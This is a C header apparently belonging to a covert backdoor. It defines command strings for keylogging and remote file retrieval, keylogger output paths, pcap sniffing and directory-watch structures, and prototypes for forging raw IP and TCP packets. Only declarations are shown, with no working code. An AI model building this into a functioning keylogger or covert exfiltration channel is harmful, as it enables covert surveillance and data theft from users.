// utils.h
#ifndef UTILS_H
#define UTILS_H

#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <pcap/pcap.h>

/* MACROS */
#define BUF_SML             32
#define BUF_MED             128
#define BUF_LRG             512
#define CMD_EXIT            "exit\n"
#define CMD_GET_KL          "get KL\n"
#define CMD_DW              "dw\0"
#define CMD_GETFILE         "getfile\0"
#define FILE_OUTPUT         "../data/output"
#define FILE_KEY_LOGGER     "../data/keylogger"

/* STRUCTURES */
typedef struct              /* struct to hold client cmd line arg */
{
    char my_ip[BUF_SML];
    char host_ip[BUF_SML];
    int min_delay;
    int max_delay;
} Client_Args;

typedef struct              /* struct to hold server cmd line arg */
{
    char my_ip[BUF_SML];
    char host_ip[BUF_SML];
    char mask[BUF_SML];
    char device[BUF_MED];
    int min_delay;
    int max_delay;
} Server_Args;

typedef struct				/* struct to represent packet (IP header and TCP header */
{
    struct iphdr ip;
    struct tcphdr tcp;
} Packet;

typedef struct				/* struct to hold server's libpcap callback function argument */
{
    pcap_t *handle;
    Server_Args srv_args;
} Server_Callback_Args;

typedef struct				/* struct to hold general libpcap callback function arguments */
{
    pcap_t *handle;
    char filename[BUF_SML];
} Pcap_Args;

typedef struct				/* struct to hold directory watch thread arguments */
{
    char dir[BUF_MED];
    Server_Args srv_args;
} Dir_Watch_Args;

/* FUNCTION PROTOTYPES */
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int create_socket(int domain, int type, int protocol);

void forge_ip(Packet *pkt, __u8 type, __u32 src, __u32 dst);
void forge_tcp(Packet *pkt);

#endif
